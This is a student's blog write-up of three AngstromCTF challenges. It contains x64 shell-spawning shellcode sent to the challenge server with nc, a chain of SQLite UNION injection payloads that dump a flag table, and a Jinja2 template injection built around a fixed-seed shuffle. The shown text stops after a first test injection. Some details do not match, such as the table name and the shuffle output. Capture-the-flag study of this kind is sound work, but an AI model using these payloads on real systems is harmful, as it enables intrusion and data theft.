@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      Week 9 - Angstrom CTF
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Week 9 - Angstrom CTF" />
+<meta name="author" content="Jake Mullins" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit." />
+<meta property="og:description" content="This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit." />
+<link rel="canonical" href="http://localhost:4000/year-of-hacking-0x9" />
+<meta property="og:url" content="http://localhost:4000/year-of-hacking-0x9" />
+<meta property="og:site_name" content="Jake Mullins" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-27T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Week 9 - Angstrom CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jake Mullins"},"dateModified":"2024-05-27T00:00:00-06:00","datePublished":"2024-05-27T00:00:00-06:00","description":"This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit.","headline":"Week 9 - Angstrom CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/year-of-hacking-0x9"},"url":"http://localhost:4000/year-of-hacking-0x9"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jake Mullins" />
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/assets/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#00aba9">
+  <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <!-- Favicon -->
+
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home...</a>
+<h1 class="post-title">Week 9 - Angstrom CTF</h1>
+<p class="post-date text-bold">
+  
+  
+    <span class="text-upcase">May 2024</span>
+  
+
+
+  
+  
+  (2742 Words, 
+  16 Minutes)
+  
+
+</p>
+
+
+  <div class="">
+    
+    <span class="tag">year-of-hacking</span>
+    
+    <span class="tag">CTF</span>
+    
+    <span class="tag">writeup</span>
+    
+  </div>
+
+
+<p>This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit.</p>
+
+<h2 id="presidential">Presidential</h2>
+<p>We get a Python file that is actually 5 of the <a href="https://en.uncyclopedia.co/wiki/C++#History">C++ mascot rats</a> in a trench coat and mustache glasses pretending to be a snake:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/local/bin/python
+</span>  
+<span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">import</span> <span class="nn">mmap</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+  
+<span class="n">flag</span> <span class="o">=</span> <span class="s">"redacted"</span>
+  
+<span class="k">print</span><span class="p">(</span><span class="s">"White House declared Python to be memory safe :tm:"</span><span class="p">)</span>
+  
+<span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">.</span><span class="n">mmap</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">mmap</span><span class="p">.</span><span class="n">PAGESIZE</span><span class="p">,</span> <span class="n">prot</span><span class="o">=</span><span class="n">mmap</span><span class="p">.</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">mmap</span><span class="p">.</span><span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">mmap</span><span class="p">.</span><span class="n">PROT_EXEC</span><span class="p">)</span>
+<span class="n">ftype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">)</span>
+<span class="n">fpointer</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="n">ftype</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">addressof</span><span class="p">(</span><span class="n">fpointer</span><span class="p">))</span>
+  
+<span class="n">u_can_do_it</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"So enter whatever you want 👍 (in hex): "</span><span class="p">))</span>
+  
+<span class="n">buf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">u_can_do_it</span><span class="p">)</span>
+  
+<span class="n">f</span><span class="p">()</span>
+  
+<span class="k">del</span> <span class="n">fpointer</span>
+<span class="n">buf</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+  
+<span class="k">print</span><span class="p">(</span><span class="s">"byebye"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>It looks like the python code:</p>
+<ul>
+  <li>Defines a chunk of memory that can be read, written to, and executed called <code class="language-plaintext highlighter-rouge">buf</code></li>
+  <li>Assigns the memory to a function <code class="language-plaintext highlighter-rouge">f</code></li>
+  <li>Takes a hex list from the user and writes it to <code class="language-plaintext highlighter-rouge">buf</code></li>
+  <li>Runs <code class="language-plaintext highlighter-rouge">f()</code>, executing whatever is in <code class="language-plaintext highlighter-rouge">buf</code>
+Basically, a super simple Remote Code Execution (RCE) vulnerability.</li>
+</ul>
+
+<p>I started writing my own shellcode, but I decided to do the safe thing and find shellcode off the internet and run it without knowing what it did. I found a website called <a href="https://shell-storm.org/shellcode/index.html">Shell Storm</a> that is a repository of shellcode samples for any kind of architecture. I landed on <a href="https://shell-storm.org/shellcode/files/shellcode-905.html">this</a> one that executes <code class="language-plaintext highlighter-rouge">/bin/sh</code> using an <code class="language-plaintext highlighter-rouge">execveat</code> call for an x64 architecture. Here’s the assembly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6a 42                   push   0x42
+58                      pop    rax
+fe c4                   inc    ah
+48 99                   cqo
+52                      push   rdx
+48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
+2f 73 68
+57                      push   rdi
+54                      push   rsp
+5e                      pop    rsi
+49 89 d0                mov    r8, rdx
+49 89 d2                mov    r10, rdx
+0f 05                   syscall
+</code></pre></div></div>
+<p>Doing some quick preprocessing in the Python REPL shell:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"""
+...     0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
+...     0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
+...     0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05"""</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">elem</span><span class="p">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)])</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="s">'6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05'</span>
+</code></pre></div></div>
+
+<p>We get a string that the server will accept and run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:53<span class="o">}</span>~/ctf/angstrom/presidential ➭ nc challs.actf.co 31200
+White House declared Python to be memory safe :tm:
+So enter whatever you want 👍 <span class="o">(</span><span class="k">in </span>hex<span class="o">)</span>: 6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
+</code></pre></div></div>
+
+<p>This gives as a very slimmed down shell for a few seconds, however we can still grab the information we need:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:54<span class="o">}</span>~/ctf/angstrom/presidential ➭ nc challs.actf.co 31200
+White House declared Python to be memory safe :tm:
+So enter whatever you want 👍 <span class="o">(</span><span class="k">in </span>hex<span class="o">)</span>: 6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
+<span class="nb">grep</span> <span class="nt">-Rnw</span> actf <span class="nb">.</span>
+./run:7:flag <span class="o">=</span> <span class="s2">"actf{python_is_memory_safe_4a105261}"</span>
+</code></pre></div></div>
+
+<h2 id="store">Store</h2>
+<p>In this challenge, we get a simple storefront.
+<img src="assets/images/blog/week9/store-front.png" alt="assets/images/blog/week9/store-front.png" />
+<br />
+<img src="assets/images/blog/week9/store-front-searched.png" alt="assets/images/blog/week9/store-front-searched.png" />
+This screams SQL injection, so lets intercept the request in Burp Suite repeater and test it:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/search</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">store.web.actf.co</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">24</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Sec-Ch-Ua</span><span class="p">:</span> <span class="s">"Chromium";v="125", "Not.A/Brand";v="24"</span>
+<span class="na">Sec-Ch-Ua-Mobile</span><span class="p">:</span> <span class="s">?0</span>
+<span class="na">Sec-Ch-Ua-Platform</span><span class="p">:</span> <span class="s">"Windows"</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://store.web.actf.co</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://store.web.actf.co/search</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+
+item=Otamatone' OR 1=1--
+</code></pre></div></div>
+<p>Returns</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;table&gt;</span>
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;th&gt;</span>Name<span class="nt">&lt;/th&gt;</span>
+		<span class="nt">&lt;th&gt;</span>Details<span class="nt">&lt;/th&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>                
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;td&gt;</span>Otamatone<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td&gt;</span>A extremely serious synthesizer. Comes in a variety of colors<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;td&gt;</span>Echo dot<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td&gt;</span>A smart speaker that can play music, make calls, and answer questions.<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>                
+	<span class="nt">&lt;tr&gt;</span>
+		<span class="nt">&lt;td&gt;</span>Razer Cynosa Chroma<span class="nt">&lt;/td&gt;</span>
+		<span class="nt">&lt;td&gt;</span>A gaming keyboard with customizable RGB lighting.<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;/tr&gt;</span>                
+<span class="nt">&lt;/table&gt;</span>
+</code></pre></div></div>
+
+<p>Showing that an SQL injection is possible. From now I’m going to truncate the inputs and results for my sanity.</p>
+
+<p>I bet we need to execute a UNION attack, which requires us to know the number of columns in the current table. Beyond the name and details column, there’s a hidden primary key column, so let’s try to UNION the result with 3 columns of made up values:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span><span class="o">=</span><span class="n">Otamatone</span><span class="s1">' UNION SELECT '</span><span class="n">a</span><span class="s1">','</span><span class="n">b</span><span class="s1">','</span><span class="k">c</span><span class="s1">'--
+</span></code></pre></div></div>
+
+<p>This successfully concatenates an extra result:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tr&gt;</span>
+	<span class="nt">&lt;td&gt;</span>b<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;td&gt;</span>c<span class="nt">&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+</code></pre></div></div>
+
+<p>To prove this is the case, adding or removing a value causes an error to be thrown:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p&gt;</span>An error occurred.<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>Now we need to figure out if there are any other tables in the database, but first we need to fingerprint the database used by the backend. I’ve done a lot of SQL injection, and it almost is always done in SQLite. We can use the following query to test my suspicion:</p>
+<pre><code class="language-SQL">item=Otamatone' OR sqlite_version()=sqlite_version()--
+</code></pre>
+
+<p>This returns the same result as my first query which shows all the entries in the table, that is <code class="language-plaintext highlighter-rouge">sqlite_version()</code> evaluates to a value, meaning that the app is using SQLite on the backend. We can use this information to look a list of all the tables in the database:</p>
+<pre><code class="language-SQL">item=Otamatone' UNION SELECT 'a', name,'c' FROM sqlite_master--
+</code></pre>
+
+<p>This returned:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tr&gt;</span>
+	<span class="nt">&lt;td&gt;</span>flags18999e4de24f117351f28f01382746e3<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;td&gt;</span>c<span class="nt">&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+</code></pre></div></div>
+
+<p>Looks like there is a table called <code class="language-plaintext highlighter-rouge">flags18999e4de24f117351f28f01382746e3</code> in the database. Let’s look at the column names of the table so we know what to fuse it with:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span><span class="o">=</span><span class="n">Otamatone</span><span class="s1">' UNION SELECT '</span><span class="n">a</span><span class="s1">', name,'</span><span class="k">c</span><span class="s1">' FROM PRAGMA_TABLE_INFO('</span><span class="n">flags18999e4de24f117351f28f01382746e3</span><span class="s1">')--
+</span></code></pre></div></div>
+
+<p>This returned:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tr&gt;</span>
+	<span class="nt">&lt;td&gt;</span>flag<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;td&gt;</span>c<span class="nt">&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+</code></pre></div></div>
+
+<p>We can get all the values from the flag column in the other table using:</p>
+<pre><code class="language-SQL">item=Otamatone' UNION SELECT 'a', flag,'c' FROM flags2cdc14366379a92e44d8f438ff39afe6--
+</code></pre>
+
+<p>This prints out the flag!</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tr&gt;</span>
+	<span class="nt">&lt;td&gt;</span>actf{37619bbd0b81c257b70013fa1572f4ed}<span class="nt">&lt;/td&gt;</span>
+	<span class="nt">&lt;td&gt;</span>c<span class="nt">&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+</code></pre></div></div>
+
+<p>Two summers ago, this challenge would have taken me hours. It’s amazing to see how quickly I was able to find the information I needed to solve this challenge. I’m excited to see what I’ll be doing two summers from now!</p>
+
+<p>To remedy this exploit, simply sanitize the user input using a reputable sql sanitization library.</p>
+<h2 id="winds">Winds</h2>
+
+<p>Jekyll interprets <code class="language-plaintext highlighter-rouge">{</code> as special syntax, so some of the inputs are incorrect. If running this yourself, make sure to remove any <code class="language-plaintext highlighter-rouge">\</code> chars in front of a <code class="language-plaintext highlighter-rouge">{</code>.</p>
+
+<p>We get a simple website that takes a user input, scrambles it, then displays it:
+<img src="assets/images/blog/week9/wind-page.png" alt="assets/images/blog/week9/wind-page.png" />
+<br />
+<img src="assets/images/blog/week9/wind-page-scrambled.png" alt="assets/images/blog/week9/wind-page-scrambled.png" /></p>
+
+<p>Here’s the source code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
+  
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>
+  
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+  
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">root</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s">'''
+        &lt;link rel="stylesheet" href="/style.css"&gt;
+        &lt;div class="content"&gt;
+            &lt;h1&gt;The windy hills&lt;/h1&gt;
+            &lt;form action="/shout" method="POST"&gt;
+                &lt;input type="text" name="text" placeholder="Hello!"&gt;
+                &lt;input type="submit" value="Shout your message..."&gt;
+            &lt;/form&gt;
+            &lt;div style="color: red;"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    '''</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'error'</span><span class="p">,</span> <span class="s">''</span><span class="p">))</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'/shout'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">shout</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="n">text</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/?error=No message provided...'</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
+<span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+
+<span class="err"> </span> <span class="err"> </span> <span class="n">random</span><span class="p">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">jumbled</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">random</span><span class="p">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">jumbled</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">jumbled</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">jumbled</span><span class="p">)</span>
+
+<span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="n">jumbled</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">rendered</span> <span class="o">=</span> <span class="s">'''
+        &lt;link rel="stylesheet" href="/style.css"&gt;
+        &lt;div class="content"&gt;
+            &lt;h1&gt;The windy hills&lt;/h1&gt;
+            &lt;form action="/shout" method="POST"&gt;
+                &lt;input type="text" name="text" placeholder="Hello!"&gt;
+                &lt;input type="submit" value="Shout your message..."&gt;
+            &lt;/form&gt;
+            &lt;div style="color: red;"&gt;&lt;/div&gt;
+            &lt;div&gt;
+                Your voice echoes back: %s
+            &lt;/div&gt;
+        &lt;/div&gt;
+    '''</span> <span class="o">%</span> <span class="n">jumbled</span>
+  
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">rendered</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'error'</span><span class="p">,</span> <span class="s">''</span><span class="p">))</span>
+  
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/style.css'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">style</span><span class="p">():</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="s">'''
+        html, body { margin: 0 }
+        .content {
+            padding: 2rem;
+            width: 90%;
+            max-width: 900px;
+            margin: auto;
+            font-family: Helvetica, sans-serif;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+    '''</span>
+  
+<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In the <code class="language-plaintext highlighter-rouge">/shout</code> endpoint, the server takes the value in the <code class="language-plaintext highlighter-rouge">text</code> field, shuffles it, and interpolates it with the string that will be interpreted as a template. The vulnerability comes from the fact that the randomness is seeded with a hardcoded value (zero), and user input is being passed to a string that will be interpreted as a template.</p>
+
+<p>A template is a way for simple logic to be embedded into HTML in a way reminiscent of PHP. In my own projects, I use it for for loops and basic conditionals, but depending on the language and the template engine, you can do some very powerful actions, like reading from files, checking for authentication, have local storage, and in our case, execute arbitrary Python code. We can exploit the deterministic nature of the shuffling to inject our syntax that will be interpreted as part of the template. In this case, the language is Jinja2, which typically uses <code class="language-plaintext highlighter-rouge">\{\{ }}</code> to denote Jinja code.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">random.shuffle</code> function takes in an iterable and swaps around its elements by indices, but it doesn’t look at the value at the index to decide where it should be shuffled to. This means that the string <code class="language-plaintext highlighter-rouge">hello</code> will get shuffled the exact same way <code class="language-plaintext highlighter-rouge">abcde</code> gets shuffled. All that matters is the length of the string.</p>
+
+<p>Our goal is to inject code into the template, meaning it needs to be ordered correctly. I created a python script that takes a target string and returns a string of unique characters that is the length of the target. We can enter that string into the website and see how it shuffles it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s">"\{\{ dict }}"</span>
+  
+<span class="n">unique_str</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=[]\;',./~!@#$%^&amp;*()_+{}|:&lt;&gt;"</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">)]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">unique_str</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>This prints out <code class="language-plaintext highlighter-rouge">abcdefghij</code>. We pass that into the website, and it returns the shuffled string <code class="language-plaintext highlighter-rouge">ecbafd</code>. We can use a little bit of scripting to build a map that pairs the indices of the original unique string to the shuffled version:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shuffled_unique_str</span> <span class="o">=</span> <span class="s">"hibfdecajg"</span>
+<span class="k">print</span><span class="p">(</span><span class="n">shuffled_unique_str</span><span class="p">)</span>
+  
+<span class="n">index_map</span> <span class="o">=</span> <span class="p">{}</span>
+  
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">unique_str</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">shuffled_unique_str</span><span class="p">)</span>
+  
+<span class="k">for</span> <span class="n">char_i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">unique_str</span><span class="p">)):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">index_map</span><span class="p">[</span><span class="n">char_i</span><span class="p">]</span> <span class="o">=</span> <span class="n">shuffled_unique_str</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">unique_str</span><span class="p">[</span><span class="n">char_i</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>We can then apply this to the target to get a string that when passed through the website, injects the target into the template:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">final_str</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">char_i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">)):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">final_str</span> <span class="o">+=</span> <span class="n">target</span><span class="p">[</span><span class="n">index_map</span><span class="p">[</span><span class="n">char_i</span><span class="p">]]</span>
+  
+<span class="k">print</span><span class="p">(</span><span class="n">final_str</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In the case of the target <code class="language-plaintext highlighter-rouge">\{\{ dict }}</code>, the shuffled string is:
+<code class="language-plaintext highlighter-rouge"> ticd}\{\{}</code>. Passing this through the website results in <code class="language-plaintext highlighter-rouge">&lt;class 'dict'&gt;</code> being printed out, implying a successful injection:
+<img src="assets/images/blog/week9/successful-dict-execution.png" alt="assets/images/blog/week9/successful-dict-execution.png" /></p>
+
